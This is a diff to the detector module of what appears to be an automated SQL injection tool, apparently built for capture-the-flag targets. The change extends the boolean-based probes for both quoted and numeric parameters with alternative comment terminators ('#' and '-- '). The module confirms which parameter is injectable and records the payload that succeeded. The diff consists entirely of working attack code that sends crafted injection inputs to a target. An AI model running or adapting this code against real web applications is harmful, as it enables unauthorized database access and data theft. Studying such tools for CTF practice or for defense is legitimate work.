@@ -117,20 +117,27 @@ class Detector:
         self.R_err = self._send(self.s.spec.base_value + "'")
 
         # 布尔确认兜底（多形态：空格被滤时 classic 全灭，需试括号/tab/内联；
-        # 登录框语义下 and 不产生差异，or 恒真=登录成功页）
+        # 登录框语义下 and 不产生差异，or 恒真=登录成功页；
+        # 尾部注释双候选：# 仅 MySQL，-- 通用 SQLite/PG）
         for suffix in ("'", "')"):
             for form, t_core, f_core in BOOL_FORMS:
-                t = self._send(f"{self.s.spec.base_value}{suffix}{t_core}#")
-                f = self._send(f"{self.s.spec.base_value}{suffix}{f_core}#")
-                if t.status_code < 0 or f.status_code < 0:
-                    continue
-                # 判定：真假页有差异，且其中一方回归基线（and:真=基线；or:假=基线）
-                if self._differs(t, f) and \
-                        (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
-                    self.log("INFO", f"命中闭合: {suffix!r}（布尔差异确认，形态={form}，"
-                                     f"核心={t_core.strip()[:12]}）")
-                    self.form = form
-                    return suffix
+                for tail in ("#", "-- "):
+                    t = self._send(f"{self.s.spec.base_value}{suffix}{t_core}{tail}")
+                    f = self._send(f"{self.s.spec.base_value}{suffix}{f_core}{tail}")
+                    if t.status_code < 0 or f.status_code < 0:
+                        continue
+                    # 判定：真假页有差异，且其中一方回归基线（and:真=基线；or:假=基线）
+                    if self._differs(t, f) and                             (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
+                        self.log("INFO", f"命中闭合: {suffix!r}（布尔差异确认，形态={form}，"
+                                         f"核心={t_core.strip()[:12]}，注释={tail!r}）")
+                        self.s.record_step(
+                            "确认注入点（布尔差异）",
+                            f"{self.s.spec.base_value}{suffix}{t_core}{tail}",
+                            f"恒真与恒假页面不同 → 参数 {self.s.spec.param!r} 可注入，"
+                            f"闭合 {suffix!r}，payload 形态={form}")
+                        self.form = form
+                        return suffix
+                continue
         return None
 
     def _probe_numeric(self) -> bool:
@@ -139,17 +146,25 @@ class Detector:
             if t_core.lstrip().lower().startswith(("or", "oorr")):
                 continue    # 数字型判定用 and/xor 语义（真=基线或翻转）
             # 数字型表达式自然结束，无需注释符（FinalSQL 类 # 被滤环境）
-            t = self._send(f"{self.s.spec.base_value}{t_core}")
-            f = self._send(f"{self.s.spec.base_value}{f_core}")
-            if t.status_code < 0 or f.status_code < 0:
+            # 尾部双候选：空尾自然结束 + # / -- 注释（部分后端拼有尾随内容）
+            for tail in ("", "#", "-- "):
+                t = self._send(f"{self.s.spec.base_value}{t_core}{tail}")
+                f = self._send(f"{self.s.spec.base_value}{f_core}{tail}")
+                if t.status_code < 0 or f.status_code < 0:
+                    continue
+                if not self._differs(t, f):
+                    continue
+                # and 语义真=基线；or 语义假=基线（恒假回落原行），任一成立即可
+                if self._same_as_base(t, 0.9) or self._same_as_base(f, 0.98):
+                    self.log("INFO", f"数字型注入确认（形态={form}，{t_core.strip()[:8]} 真假差异）")
+                    self.s.record_step(
+                        "确认注入点（数字型布尔差异）",
+                        f"{self.s.spec.base_value}{t_core}{tail}",
+                        f"参数 {self.s.spec.param!r} 为数字型注入（无需引号闭合），形态={form}")
+                    self.form = form
+                    return True
                 continue
-            if not self._differs(t, f):
-                continue
-            # and 语义真=基线；or 语义假=基线（恒假回落原行），任一成立即可
-            if self._same_as_base(t, 0.9) or self._same_as_base(f, 0.98):
-                self.log("INFO", f"数字型注入确认（形态={form}，{t_core.strip()[:8]} 真假差异）")
-                self.form = form
-                return True
+            continue
         return False
 
     @staticmethod
